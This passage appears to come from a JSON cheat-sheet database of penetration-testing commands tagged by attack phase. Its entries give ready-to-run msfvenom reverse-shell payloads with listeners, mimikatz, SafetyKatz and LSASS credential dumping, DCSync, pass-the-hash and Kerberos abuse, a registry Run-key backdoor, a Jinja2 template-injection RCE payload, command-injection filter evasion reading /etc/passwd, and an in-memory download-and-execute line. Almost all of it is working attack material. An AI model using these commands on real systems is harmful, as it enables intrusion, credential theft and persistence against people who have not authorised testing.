          "command": "john --wordlist=/usr/share/wordlists/rockyou.txt hashes.md5 --format=md5crypt-long\n"
        }
      ],
      "description": "Crack hashes with john and a wordlist, picking the format.",
      "os": [
        "Linux"
      ],
      "category": [
        "cli"
      ],
      "phase": [
        "Cracking"
      ],
      "references": [
        "https://www.openwall.com/john/"
      ],
      "name": "john"
    },
    {
      "variants": [
        {
          "label": "creds",
          "command": "ldapsearch -h $DOMAIN -D '$USER@$DOMAIN' -w $PASSWORD -b 'dc=$DOMAIN,dc=local'\n"
        },
        {
          "label": "anonymous",
          "command": "ldapsearch -H ldap://$IP -LLL -x -b'' -s base '(objectclass=*)'\n"
        }
      ],
      "description": "Query LDAP, by auth method.",
      "os": [
        "Linux"
      ],
      "category": [
        "oscp",
        "cli"
      ],
      "service": [
        "LDAP"
      ],
      "phase": [
        "Enumeration"
      ],
      "references": [
        "https://linux.die.net/man/1/ldapsearch"
      ],
      "name": "ldapsearch"
    },
    {
      "command": "./LinEnum-ng.sh\n",
      "description": "Linux local enumeration and privilege-escalation script.",
      "os": [
        "Linux"
      ],
      "category": [
        "oscp",
        "cli"
      ],
      "phase": [
        "Enumeration",
        "PrivEsc"
      ],
      "references": [
        "https://github.com/strikoder/LinEnum-ng"
      ],
      "name": "linenum-ng"
    },
    {
      "command": "lsassy -u $USER -p $PASSWORD -d $DOMAIN $IP\n",
      "description": "Dump LSASS credentials remotely without touching disk.",
      "os": [
        "Linux"
      ],
      "category": [
        "oscp",
        "cli"
      ],
      "service": [
        "SMB"
      ],
      "phase": [
        "PrivEsc"
      ],
      "references": [
        "https://github.com/Hackndo/lsassy"
      ],
      "name": "lsassy"
    },
    {
      "variants": [
        {
          "label": "trace-libc",
          "command": "ltrace -o ltrace.log ./$FILE\n"
        }
      ],
      "description": "Trace library calls (strcmp, strlen, memcmp, etc.) in dynamic binaries.",
      "os": [
        "Linux"
      ],
      "category": [
        "cli"
      ],
      "phase": [
        "Enumeration"
      ],
      "references": [
        "https://github.com/zernanvash/cheatsheet/blob/main/tools/Reversing%20CLI%20Tools%20Cheat%20Sheet.md"
      ],
      "name": "ltrace"
    },
    {
      "variants": [
        {
          "label": "dump",
          "command": ".\\mimikatz.exe \"privilege::debug\" \"token::elevate\" \"sekurlsa::logonpasswords\" \"lsadump::sam\" \"exit\"\n"
        },
        {
          "label": "lsass-offline",
          "command": ".\\mimikatz.exe \"privilege::debug\" \"sekurlsa::minidump lsass.dmp\" \"sekurlsa::logonpasswords\" \"exit\"\n"
        },
        {
          "label": "pth",
          "command": ".\\mimikatz.exe \"privilege::debug\" \"sekurlsa::pth /user:$USER /domain:$DOMAIN /ntlm:$HASH /run:cmd.exe\" \"exit\"\n"
        },
        {
          "label": "ptt",
          "command": ".\\mimikatz.exe \"kerberos::ptt ticket.kirbi\" \"exit\"\n"
        },
        {
          "label": "dcsync-all",
          "command": ".\\mimikatz.exe \"lsadump::dcsync /domain:$DOMAIN /all\" \"exit\"\n"
        },
        {
          "label": "dcsync-user",
          "command": ".\\mimikatz.exe \"lsadump::dcsync /domain:$DOMAIN /user:$DOMAIN\\administrator\" \"exit\"\n"
        }
      ],
      "description": "Dump credentials and DCSync with mimikatz, by action.",
      "os": [
        "Windows"
      ],
      "category": [
        "oscp"
      ],
      "service": [
        "AD"
      ],
      "phase": [
        "CredAccess"
      ],
      "references": [
        "https://github.com/gentilkiwi/mimikatz"
      ],
      "name": "mimikatz"
    },
    {
      "command": "mitm6 -d $DOMAIN --ignore-nofqnd\n",
      "description": "Poison DHCPv6 replies to capture NTLM authentication (pair with ntlmrelayx).",
      "os": [
        "Linux"
      ],
      "category": [
        "oscp",
        "cli"
      ],
      "service": [
        "DNS"
      ],
      "phase": [
        "Exploitation"
      ],
      "references": [
        "https://github.com/dirkjanm/mitm6"
      ],
      "name": "mitm6"
    },
    {
      "command": "msfdb run\n",
      "description": "Start the Metasploit database and launch msfconsole.",
      "os": [
        "Linux"
      ],
      "category": [
        "cli"
      ],
      "phase": [
        "Exploitation"
      ],
      "references": [
        "https://docs.metasploit.com/docs/using-metasploit/getting-started/msfconsole.html"
      ],
      "name": "msfdb"
    },
    {
      "variants": [
        {
          "label": "linux-elf",
          "command": "msfvenom -p linux/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf -o shell.elf\nmsfconsole -x 'use exploit/multi/handler;set payload linux/x64/shell_reverse_tcp;set LHOST $LHOST;set LPORT $LPORT;run;'\n"
        },
        {
          "label": "windows-meterpreter",
          "command": "msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o reverse.exe\nmsfconsole -x 'use exploit/multi/handler;set payload windows/x64/meterpreter_reverse_tcp;set LHOST $LHOST;set LPORT $LPORT;run;'\n"
        },
        {
          "label": "php",
          "command": "msfvenom -p php/reverse_php LHOST=$LHOST LPORT=$LPORT -f raw > reverse.php\nmsfconsole -x 'use exploit/multi/handler;set payload php/reverse_php;set LHOST $LHOST;set LPORT $LPORT;run;'\n"
        }
      ],
      "description": "Generate a reverse shell payload with msfvenom and start its matching handler, by target.",
      "os": [
        "Linux"
      ],
      "category": [
        "oscp",
        "cli"
      ],
      "service": [
        "HTTP"
      ],
      "phase": [
        "Exploitation"
      ],
      "references": [
        "https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html"
      ],
      "name": "msfvenom"
    },
    {
      "command": "mysql -h $IP -P 3306 -u root -p\"\" --skip-ssl\n",
      "description": "Connect to a MySQL server as root with no password.",
      "os": [
        "Linux"
      ],
      "category": [
        "cli"
      ],
      "service": [
        "MySQL"
      ],
      "phase": [
        "Exploitation"
      ],
      "references": [
        "https://dev.mysql.com/doc/refman/8.0/en/mysql-command-options.html"
      ],
      "name": "mysql"
    },
    {
      "command": "uv run nagoyaspray.py --seasons --months --start 2020 --end 2025 -s \"!\" -o passwords.txt\n",
      "description": "Generate seasonal and monthly password lists for spraying.",
      "os": [
        "Linux"
      ],
      "category": [
        "oscp",
        "cli"
      ],
      "phase": [
        "Cracking"
      ],
      "references": [
        "https://github.com/strikoder/NagoyaSpray"
      ],
      "name": "nagoyaspray"
    },
    {
      "variants": [
        {
          "label": "full-tcp",
          "command": "nmap -Pn -sCV -p- $IP -vv -oN nmap_full -T4 --min-rate 2000 --max-retries 20 --open\n"
        },
        {
          "label": "udp",
          "command": "nmap -Pn -sC -sU -p 69,123,161,162,500,4500 $IP --open -vv\n"
        }
      ],
      "description": "Scan a host with nmap, by scan type.",
      "os": [
        "Linux"
      ],
      "category": [
        "oscp",
        "cli"
      ],
      "service": [
        "SNMP"
      ],
      "phase": [
        "Enumeration"
      ],
      "references": [
        "https://nmap.org/book/man.html"
      ],
      "name": "nmap"
    },
    {
      "variants": [
        {
          "label": "dns",
          "command": "noauth_dns $IP $DOMAIN [subdomains.txt]\n"
        },
        {
          "label": "kerberos",
          "command": "noauth_kerberos -t $DCIP -d $DOMAIN\n"
        },
        {
          "label": "smb",
          "command": "noauth_smb $IP\n"
        },
        {
          "label": "ldap",
          "command": "noauth_ldap $IP $DOMAIN [ldap|ldaps]\n"
        }
      ],
      "description": "Unauthenticated enumeration helpers (OffensiveSecurityScripts), by protocol.",
      "os": [
        "Linux"
      ],
      "category": [
        "oscp",
        "cli"
      ],
      "service": [
        "DNS",
        "Kerberos",
        "SMB",
        "LDAP"
      ],
      "phase": [
        "Enumeration"
      ],
      "references": [
        "https://github.com/strikoder/OffensiveSecurityScripts"
      ],
      "name": "noauth-enum"
    },
    {
      "variants": [
        {
          "label": "default",
          "command": "nuclei -target http://$IP -fr\n"
        },
        {
          "label": "headless",
          "command": "nuclei -target http://$IP -fr --headless\n"
        }
      ],
      "description": "Run a nuclei vulnerability scan, optionally with headless browser templates.",
      "os": [
        "Linux"
      ],
      "category": [
        "cli"
      ],
      "service": [
        "HTTP"
      ],
      "phase": [
        "Enumeration"
      ],
      "references": [
        "https://github.com/projectdiscovery/nuclei"
      ],
      "name": "nuclei"
    },
    {
      "variants": [
        {
          "label": "smb",
          "command": "nxc smb $IP -u '$USER' -p '$PASSWORD' --groups --local-groups --loggedon-users --rid-brute --sessions --users --shares --pass-pol\nnxc smb $IP -u 'a' -p ''\nnxc smb $IP -u '$USER' -p '$PASSWORD' -X 'whoami'\nnxc smb $IP -u $USER -p $PASSWORD -M coerce_plus\nnxc smb $IP -M timeroast\nnxc smb smb_hosts.txt --gen-relay-list relay_targets.txt\n"
        },
        {
          "label": "ldap",
          "command": "nxc ldap $IP -u '$USER' -p '$PASSWORD' --trusted-for-delegation --password-not-required --admin-count --users --groups\nnxc ldap $IP -u users.txt -p '' --asreproast hashes.asrep\nnxc ldap $IP -u '$USER' -p '$PASSWORD' --kerberoasting hashes.kerberoast\n"
        },
        {
          "label": "winrm",
          "command": "nxc winrm $IP -u usernames.txt -p $PASSWORD -d $DOMAIN --local-auth\nnxc winrm $IP -u $USER -H $HASH\n"
        }
      ],
      "description": "Enumerate or attack a host with NetExec, by protocol.",
      "os": [
        "Linux"
      ],
      "category": [
        "oscp",
        "cli"
      ],
      "have": [
        "hash"
      ],
      "service": [
        "SMB",
        "LDAP",
        "WinRM"
      ],
      "phase": [
        "Enumeration",
        "Exploitation"
      ],
      "references": [
        "https://github.com/Pennyw0rth/NetExec"
      ],
      "name": "nxc"
    },
    {
      "command": "uv run PetitPotam.py -d $DOMAIN -u $USER -p $PASSWORD $LHOST $IP\n",
      "description": "Coerce NTLM authentication from a DC via MS-EFSRPC (pair with ntlmrelayx).",
      "os": [
        "Linux"
      ],
      "category": [
        "oscp",
        "cli"
      ],
      "service": [
        "RPC"
      ],
      "phase": [
        "Exploitation"
      ],
      "references": [
        "https://github.com/topotam/PetitPotam"
      ],
      "name": "petitpotam"
    },
    {
      "variants": [
        {
          "label": "crack",
          "command": "pfx2john administrator.pfx > pfx.hash\njohn --wordlist=/usr/share/wordlists/rockyou.txt pfx.hash\n"
        },
        {
          "label": "to-pem",
          "command": "openssl pkcs12 -in cert.pfx -out pub.pem -clcerts -nokeys\nopenssl pkcs12 -in cert.pfx -out priv.pem -nocerts -nodes\n"
        }
      ],
      "description": "Crack a PFX password or split it into PEM cert and key (for evil-winrm).",
      "os": [
        "Linux"
      ],
      "category": [
        "oscp",
        "cli"
      ],
      "have": [
        "cert"
      ],
      "service": [
        "ADCS"
      ],
      "phase": [
        "CredAccess"
      ],
      "references": [
        "https://github.com/openwall/john"
      ],
      "name": "pfx"
    },
    {
      "variants": [
        {
          "label": "load",
          "command": "iex (new-object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1')\nImport-ActiveDirectory\n"
        },
        {
          "label": "initial-enum",
          "command": "Get-ADDomain\nGet-ADForest\nGet-ADTrust -Filter *\nGet-ADDomainController -Filter *\nGet-ADUser -Filter * -Properties * | Select-Object SamAccountName,Enabled,LastLogonDate\n"
        },
        {
          "label": "kerberoast",
          "command": "Get-ADUser -Filter {ServicePrincipalName -ne \"$null\"} -Properties ServicePrincipalName |\n  Select-Object SamAccountName,ServicePrincipalName\n"
        },
        {
          "label": "delegation-enum",
          "command": "Get-ADComputer -Filter {TrustedForDelegation -eq $True} -Properties TrustedForDelegation,ServicePrincipalName\nGet-ADUser -Filter {TrustedForDelegation -eq $True} -Properties TrustedForDelegation\nGet-ADObject -Filter {msDS-AllowedToDelegateTo -ne \"$null\"} -Properties msDS-AllowedToDelegateTo\n"
        }
      ],
      "description": "Enumerate AD with the in-memory PowerShell AD module, by task.",
      "os": [
        "Windows"
      ],
      "category": [
        "oscp"
      ],
      "service": [
        "LDAP",
        "Kerberos"
      ],
      "phase": [
        "Enumeration",
        "PrivEsc"
      ],
      "references": [
        "https://github.com/samratashok/ADModule"
      ],
      "name": "pwsh-admodule"
    },
    {
      "command": "uv run ldapmonitor.py --dc-ip $IP -u '$USER' -d '$DOMAIN' -p '$PASSWORD'\n",
      "description": "Monitor AD for LDAP changes in real time (creates, deletes, modifications).",
      "os": [
        "Linux"
      ],
      "category": [
        "oscp",
        "cli"
      ],
      "service": [
        "LDAP"
      ],
      "phase": [
        "Enumeration"
      ],
      "references": [
        "https://github.com/p0dalirius/LDAPmonitor"
      ],
      "name": "pyldapmonitor"
    },
    {
      "command": "uv run pywhisker.py --dc-ip \"$IP\" -d \"$DOMAIN\" -u \"$USER\" -p \"$PASSWORD\" --target \"$TARGET_USER\" --action \"list\"\n",
      "description": "Manipulate msDS-KeyCredentialLink for shadow credential attacks.",
      "os": [
        "Linux"
      ],
      "category": [
        "oscp",
        "cli"
      ],
      "service": [
        "LDAP"
      ],
      "phase": [
        "PrivEsc"
      ],
      "references": [
        "https://github.com/ShutdownRepo/pywhisker"
      ],
      "name": "pywhisker"
    },
    {
      "variants": [
        {
          "label": "headers",
          "command": "readelf -h $FILE\n"
        },
        {
          "label": "sections",
          "command": "readelf -S $FILE\n"
        },
        {
          "label": "symbols",
          "command": "readelf -s $FILE\n"
        },
        {
          "label": "imports",
          "command": "readelf -r $FILE\n"
        },
        {
          "label": "dynamic",
          "command": "readelf -d $FILE\n"
        }
      ],
      "description": "Inspect ELF headers, sections, symbols, relocation table, or dynamic tags.",
      "os": [
        "Linux"
      ],
      "category": [
        "cli"
      ],
      "phase": [
        "Enumeration"
      ],
      "references": [
        "https://github.com/zernanvash/cheatsheet/blob/main/tools/Reversing%20CLI%20Tools%20Cheat%20Sheet.md"
      ],
      "name": "readelf"
    },
    {
      "command": "redis-cli -h $IP --user $USER -a $PASSWORD\n",
      "description": "Connect to a Redis instance with authentication.",
      "os": [
        "Linux"
      ],
      "category": [
        "cli"
      ],
      "service": [
        "Redis"
      ],
      "phase": [
        "Exploitation"
      ],
      "references": [
        "https://redis.io/docs/manual/cli/"
      ],
      "name": "redis-cli"
    },
    {
      "variants": [
        {
          "label": "save-sam",
          "command": "reg save HKLM\\SAM C:\\Temp\\SAM\nreg save HKLM\\SYSTEM C:\\Temp\\SYSTEM\nreg save HKLM\\SECURITY C:\\Temp\\SECURITY\n"
        },
        {
          "label": "run-persistence",
          "command": "reg add HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /t REG_SZ /d \"C:\\Windows\\Temp\\shell.exe\" /f\n"
        }
      ],
      "description": "Use reg.exe to dump hives or set a Run-key, by action.",
      "os": [
        "Windows"
      ],
      "category": [
        "oscp"
      ],
      "service": [
        "AD"
      ],
      "phase": [
        "CredAccess",
        "Persistence"
      ],
      "references": [
        "https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/reg"
      ],
      "name": "reg"
    },
    {
      "command": "Responder -I eth0 -A\n",
      "description": "Run Responder in analyze mode, listen and log without poisoning.",
      "os": [
        "Linux"
      ],
      "category": [
        "oscp",
        "cli"
      ],
      "service": [
        "SMB"
      ],
      "phase": [
        "Enumeration"
      ],
      "references": [
        "https://github.com/lgandx/Responder"
      ],
      "name": "responder"
    },
    {
      "variants": [
        {
          "label": "search-gadget",
          "command": "ROPgadget --binary $FILE | grep '$SEARCH'\n"
        },
        {
          "label": "ropper-search",
          "command": "ropper --file $FILE --search '$SEARCH'\n"
        }
      ],
      "description": "Search for assembly instruction gadgets to build return-oriented programming (ROP) exploits.",
      "os": [
        "Linux"
      ],
      "category": [
        "cli"
      ],
      "phase": [
        "Exploitation"
      ],
      "references": [
        "https://github.com/zernanvash/cheatsheet/blob/main/tools/Reversing%20CLI%20Tools%20Cheat%20Sheet.md"
      ],
      "name": "ropgadget"
    },
    {
      "command": "rpcclient -U '' -N $IP\n",
      "description": "Connect to RPC with a null session (no credentials).",
      "os": [
        "Linux"
      ],
      "category": [
        "oscp",
        "cli"
      ],
      "service": [
        "RPC"
      ],
      "phase": [
        "Enumeration"
      ],
      "references": [
        "https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html"
      ],
      "name": "rpcclient"
    },
    {
      "variants": [
        {
          "label": "kerberoast",
          "command": "Rubeus.exe kerberoast /domain:$DOMAIN /outfile:hashes.kerberoast\n"
        },
        {
          "label": "asktgt",
          "command": "Rubeus.exe asktgt /user:$USER /password:$PASSWORD /domain:$DOMAIN /ptt\n"
        },
        {
          "label": "asreproast",
          "command": "Rubeus.exe asreproast /domain:$DOMAIN /format:hashcat /outfile:asrep-hashes.txt\n"
        },
        {
          "label": "s4u",
          "command": "Rubeus.exe s4u /user:$USER /rc4:$HASH /impersonateuser:Administrator /msdsspn:cifs/$IP /domain:$DOMAIN /ptt\n"
        },
        {
          "label": "brute",
          "command": "Rubeus.exe brute /users:users.txt /passwords:passwords.txt /domain:$DOMAIN /outfile:bruteforce.txt\n"
        }
      ],
      "description": "Kerberos abuse on Windows with Rubeus, by action.",
      "os": [
        "Windows"
      ],
      "category": [
        "oscp"
      ],
      "have": [
        "hash"
      ],
      "service": [
        "Kerberos"
      ],
      "phase": [
        "PrivEsc",
        "LateralMovement",
        "InitialAccess"
      ],
      "references": [
        "https://github.com/GhostPack/Rubeus"
      ],
      "name": "rubeus"
    },
    {
      "command": "rusthound-ce -d $DOMAIN -u $USER@$DOMAIN -p $PASSWORD -z\n",
      "description": "Collect BloodHound data from a domain remotely using RustHound.",
      "os": [
        "Linux"
      ],
      "category": [
        "oscp",
        "cli"
      ],
      "service": [
        "LDAP"
      ],
      "phase": [
        "Enumeration"
      ],
      "references": [
        "https://github.com/NH-RED-TEAM/RustHound"
      ],
      "name": "rusthound"
    },
    {
      "command": "SafetyKatz.exe \"sekurlsa::logonpasswords\" \"exit\"\n",
      "description": "Run Mimikatz commands in-memory via .NET reflection to dump credentials.",
      "os": [
        "Windows"
      ],
      "category": [
        "oscp"
      ],
      "service": [
        "AD"
      ],
      "phase": [
        "CredAccess"
      ],
      "references": [
        "https://github.com/GhostPack/SafetyKatz"
      ],
      "name": "safetykatz"
    },
    {
      "command": "scp nc.exe $USER@$IP:\"C:\\\\users\\\\$USER\"\n",
      "description": "Upload a file to a remote Windows host via SCP.",
      "os": [
        "Linux"
      ],
      "category": [
        "cli"
      ],
      "service": [
        "SSH"
      ],
      "phase": [
        "Exploitation"
      ],
      "references": [
        "https://man.openbsd.org/scp"
      ],
      "name": "scp"
    },
    {
      "command": "Seatbelt.exe -group=all\n",
      "description": "Run all Seatbelt checks for host-based situational awareness and privilege escalation intel.",
      "os": [
        "Windows"
      ],
      "category": [
        "oscp"
      ],
      "service": [
        "AD"
      ],
      "phase": [
        "Enumeration"
      ],
      "references": [
        "https://github.com/GhostPack/Seatbelt"
      ],
      "name": "seatbelt"
    },
    {
      "command": "SharpDump.exe\n",
      "description": "Minidump LSASS process memory to disk for offline credential extraction.",
      "os": [
        "Windows"
      ],
      "category": [
        "oscp"
      ],
      "service": [
        "AD"
      ],
      "phase": [
        "CredAccess"
      ],
      "references": [
        "https://github.com/GhostPack/SharpDump"
      ],
      "name": "sharpdump"
    },
    {
      "variants": [
        {
          "label": "All",
          "command": "SharpHound.exe --CollectionMethods All --ZipFileName output.zip"
        },
        {
          "label": "DCOnly",
          "command": "SharpHound.exe --CollectionMethods DCOnly --Domain $DOMAIN --ZipFileName output.zip"
        }
      ],
      "description": "Collect BloodHound data from a domain-joined Windows host (All) or via DC-only LDAP queries (DCOnly).",
      "os": [
        "Windows"
      ],
      "category": [
        "oscp"
      ],
      "service": [
        "LDAP"
      ],
      "phase": [
        "Enumeration"
      ],
      "references": [
        "https://bloodhound.specterops.io/collect-data/ce-collection/sharphound"
      ],
      "name": "sharphound"
    },
    {
      "command": "SharpLDAPmonitor.exe /dcIP:$DCIP /user:$USER /pass:$PASSWORD\n",
      "description": "Monitor LDAP for real-time object creation, deletion, and modification events.",
      "os": [
        "Windows"
      ],
      "category": [
        "oscp"
      ],
      "service": [
        "LDAP"
      ],
      "phase": [
        "Enumeration"
      ],
      "references": [
        "https://github.com/p0dalirius/SharpLDAPmonitor"
      ],
      "name": "sharpldapmonitor"
    },
    {
      "command": "SharpUp.exe audit\n",
      "description": "Audit Windows host for common privilege escalation vectors.",
      "os": [
        "Windows"
      ],
      "category": [
        "oscp"
      ],
      "service": [
        "AD"
      ],
      "phase": [
        "PrivEsc"
      ],
      "references": [
        "https://github.com/GhostPack/SharpUp"
      ],
      "name": "sharpup"
    },
    {
      "command": "SharpWMI.exe computername=$IP action=exec command=\"cmd.exe /c whoami > C:\\Temp\\out.txt\"\n",
      "description": "Execute a command on a remote host via WMI from Windows.",
      "os": [
        "Windows"
      ],
      "category": [
        "oscp"
      ],
      "service": [
        "WMI"
      ],
      "phase": [
        "LateralMovement"
      ],
      "references": [
        "https://github.com/GhostPack/SharpWMI"
      ],
      "name": "sharpwmi"
    },
    {
      "variants": [
        {
          "label": "native",
          "command": "smbclient \\\\\\\\$IP\\\\IT -U $USER%$PASSWORD\n"
        },
        {
          "label": "hash",
          "command": "smbclient \\\\\\\\$IP\\\\IT -U $USER --pw-nt-hash $HASH\n"
        },
        {
          "label": "impacket",
          "command": "impacket-smbclient $DOMAIN/$USER:$PASSWORD@$IP\n"
        },
        {
          "label": "ticket",
          "command": "impacket-smbclient -k -no-pass $DOMAIN/$USER@$IP\n"
        }
      ],
      "description": "Connect to SMB shares interactively, native client or impacket, by auth method.",
      "os": [
        "Linux"
      ],
      "category": [
        "oscp",
        "cli"
      ],
      "have": [
        "hash",
        "ticket"
      ],
      "service": [
        "SMB"
      ],
      "phase": [
        "Exploitation"
      ],
      "references": [
        "https://www.samba.org/samba/docs/current/man-html/smbclient.1.html",
        "https://github.com/fortra/impacket"
      ],
      "name": "smbclient"
    },
    {
      "command": "Snaffler.exe -s -d $DOMAIN -o snaffler.log -v data\n",
      "description": "Search accessible SMB shares across the domain for interesting files and credentials.",
      "os": [
        "Windows"
      ],
      "category": [
        "oscp"
      ],
      "service": [
        "SMB"
      ],
      "phase": [
        "Enumeration"
      ],
      "references": [
        "https://github.com/SnaffCon/Snaffler"
      ],
      "name": "snaffler"
    },
    {
      "command": "snmpbulkwalk -v2c -c public $IP NET-SNMP-EXTEND-MIB::nsExtendObjects\n",
      "description": "Enumerate SNMP extend objects (often used for RCE via net-snmp extensions).",
      "os": [
        "Linux"
      ],
      "category": [
        "oscp",
        "cli"
      ],
      "service": [
        "SNMP"
      ],
      "phase": [
        "Enumeration"
      ],
      "references": [
        "http://www.net-snmp.org/docs/man/snmpbulkwalk.html"
      ],
      "name": "snmpbulkwalk"
    },
    {
      "variants": [
        {
          "label": "local-forward",
          "command": "ssh -L 1234:127.0.0.1:1234 $USER@$IP\n"
        },
        {
          "label": "ticket",
          "command": "ssh -K $USER@$IP\n"
        }
      ],
      "description": "SSH local port forward or Kerberos (GSSAPI) login.",
      "os": [
        "Linux"
      ],
      "category": [
        "oscp",
        "cli"
      ],
      "have": [
        "ticket"
      ],
      "service": [
        "SSH"
      ],
      "phase": [
        "Pivoting"
      ],
      "references": [
        "https://man.openbsd.org/ssh"
      ],
      "name": "ssh"
    },
    {
      "variants": [
        {
          "label": "trace-syscalls",
          "command": "strace -f -o strace.log ./$FILE\n"
        },
        {
          "label": "filter-files",
          "command": "strace -e trace=file ./$FILE\n"
        },
        {
          "label": "filter-specific",
          "command": "strace -e trace=openat,read,write,execve ./$FILE\n"
        }
      ],
      "description": "Trace system calls, processes, and signals.",
      "os": [
        "Linux"
      ],
      "category": [
        "cli"
      ],
      "phase": [
        "Enumeration"
      ],
      "references": [
        "https://github.com/zernanvash/cheatsheet/blob/main/tools/Reversing%20CLI%20Tools%20Cheat%20Sheet.md"
      ],
      "name": "strace"
    },
    {
      "command": "./username-anarchy --input-file ./test-names.txt --select.format first.last\n",
      "description": "Generate candidate usernames from a list of real names.",
      "os": [
        "Linux"
      ],
      "category": [
        "oscp",
        "cli"
      ],
      "phase": [
        "Enumeration"
      ],
      "references": [
        "https://github.com/urbanadventurer/username-anarchy"
      ],
      "name": "username-anarchy"
    },
    {
      "variants": [
        {
          "label": "convert-wat",
          "command": "wasm2wat $FILE -o module.wat\n"
        },
        {
          "label": "decompile",
          "command": "wasm-decompile $FILE > module.c\n"
        }
      ],
      "description": "Convert WebAssembly to WebAssembly Text (WAT) or decompile to pseudo-C code.",
      "os": [
        "Linux"
      ],
      "category": [
        "cli"
      ],
      "phase": [
        "Enumeration"
      ],
      "references": [
        "https://github.com/zernanvash/cheatsheet/blob/main/tools/Reversing%20CLI%20Tools%20Cheat%20Sheet.md"
      ],
      "name": "wasm2wat"
    },
    {
      "command": "wfuzz -u http://$IP -H \"Host: FUZZ.$DOMAIN\" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --hh 315\n",
      "description": "Fuzz virtual hostnames using a wordlist.",
      "os": [
        "Linux"
      ],
      "category": [
        "cli"
      ],
      "service": [
        "HTTP"
      ],
      "phase": [
        "Enumeration"
      ],
      "references": [
        "https://github.com/xmendez/wfuzz"
      ],
      "name": "wfuzz"
    },
    {
      "command": "winPEASany.exe\n",
      "description": "Run winPEAS to enumerate Windows privilege escalation vectors, misconfigs, and stored credentials.",
      "os": [
        "Windows"
      ],
      "category": [
        "oscp"
      ],
      "service": [
        "AD"
      ],
      "phase": [
        "PrivEsc"
      ],
      "references": [
        "https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS"
      ],
      "name": "winpeas"
    },
    {
      "command": "wpscan --url http://$IP --enumerate ap,u,t\n",
      "description": "Enumerate WordPress plugins, users, and themes.",
      "os": [
        "Linux"
      ],
      "category": [
        "cli"
      ],
      "service": [
        "HTTP"
      ],
      "phase": [
        "Enumeration"
      ],
      "references": [
        "https://github.com/wpscanteam/wpscan"
      ],
      "name": "wpscan"
    },
    {
      "variants": [
        {
          "label": "creds",
          "command": "xfreerdp3 /v:$IP /u:$USER /p:$PASSWORD /dynamic-resolution /cert:ignore\n"
        },
        {
          "label": "hash",
          "command": "xfreerdp3 /v:$IP /u:$USER /pth:$HASH /dynamic-resolution /cert:ignore /sec:tls /d:$DOMAIN\n"
        }
      ],
      "description": "Connect to a Windows RDP session, by auth method.",
      "os": [
        "Linux"
      ],
      "category": [
        "oscp",
        "cli"
      ],
      "have": [
        "hash"
      ],
      "service": [
        "RDP"
      ],
      "phase": [
        "Exploitation"
      ],
      "references": [
        "https://github.com/FreeRDP/FreeRDP"
      ],
      "name": "xfreerdp"
    },
    {
      "command": "{{request.application.__globals__.__builtins__.__import__('os').popen('$COMMAND').read()}}\n",
      "description": "Server-Side Template Injection (SSTI) RCE payload for Jinja2/Flask template backends.",
      "os": [
        "Linux"
      ],
      "category": [
        "cli"
      ],
      "phase": [
        "Exploitation"
      ],
      "references": [
        "https://github.com/zernanvash/cheatsheet/blob/main/guides/Web%20Exploitation%20Playbook.md#211-server-side-template-injection-ssti"
      ],
      "name": "ssti-jinja2"
    },
    {
      "command": "medusa -h $IP -U $USERLIST -P /usr/share/wordlists/rockyou.txt -M ssh -t 4\n",
      "description": "SSH online brute force using Medusa with thread throttling.",
      "os": [
        "Linux"
      ],
      "category": [
        "oscp",
        "cli"
      ],
      "service": [
        "SSH"
      ],
      "phase": [
        "Exploitation"
      ],
      "references": [
        "https://github.com/jofpin/medusa"
      ],
      "name": "medusa-ssh"
    },
    {
      "command": "zip2john $FILE > zip.hash\n",
      "description": "Extract password hashes from encrypted ZIP archives.",
      "os": [
        "Linux"
      ],
      "category": [
        "oscp",
        "cli"
      ],
      "phase": [
        "Enumeration"
      ],
      "references": [
        "https://github.com/openwall/john"
      ],
      "name": "zip2john"
    },
    {
      "command": "msfvenom -p android/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -o $OUTFILE.apk\n",
      "description": "Generate an Android reverse TCP APK payload using msfvenom.",
      "os": [
        "Linux"
      ],
      "category": [
        "oscp",
        "cli"
      ],
      "phase": [
        "InitialAccess"
      ],
      "references": [
        "https://github.com/rapid7/metasploit-framework"
      ],
      "name": "msfvenom-android"
    },
    {
      "variants": [
        {
          "label": "linux-spaces",
          "command": "cat${IFS}${PATH:0:1}etc${PATH:0:1}passwd\n"
        },
        {
          "label": "windows-slashes",
          "command": "echo %HOMEPATH:~6,-11%\n"
        },
        {
          "label": "cmd-caret",
          "command": "who^ami\n"
        }
      ],
      "description": "Evade basic filters and blacklists inside shell command injection inputs.",
      "os": [
        "Linux",
        "Windows"
      ],
      "category": [
        "cli"
      ],
      "phase": [
        "Exploitation"
      ],
      "references": [
        "https://github.com/zernanvash/cheatsheet/blob/main/guides/Web%20Exploitation%20Playbook.md#22-command-injection"
      ],
      "name": "cmd-injection-bypass"
    },
    {
      "command": "git clone https://github.com/Bashfuscator/Bashfuscator && cd Bashfuscator && pip3 install setuptools==65 && python3 setup.py install --user\n",
      "description": "Install Bashfuscator CLI tool to generate heavily obfuscated bash commands.",
      "os": [
        "Linux"
      ],
      "category": [
        "cli"
      ],
      "phase": [
        "Exploitation"
      ],
      "references": [
        "https://github.com/Bashfuscator/Bashfuscator"
      ],
      "name": "bashfuscator"
    },
    {
      "command": "Import-Module .\\Invoke-DOSfuscation.psd1; Invoke-DOSfuscation\n",
      "description": "Load Invoke-DOSfuscation shell to generate obfuscated cmd payload parameters.",
      "os": [
        "Windows"
      ],
      "category": [
        "cli"
      ],
      "phase": [
        "Exploitation"
      ],
      "references": [
        "https://github.com/danielbohannon/Invoke-DOSfuscation"
      ],
      "name": "invoke-dosfuscation"
    },
    {
      "variants": [
        {
          "label": "perl",
          "command": "perl -e 'exec \"/bin/bash\";'\n"
        },
        {
          "label": "ruby",
          "command": "ruby -e 'exec \"/bin/bash\"'\n"
        },
        {
          "label": "lua",
          "command": "lua -e 'os.execute(\"/bin/sh\")'\n"
        },
        {
          "label": "awk",
          "command": "awk 'BEGIN {system(\"/bin/bash\")}'\n"
        },
        {
          "label": "find",
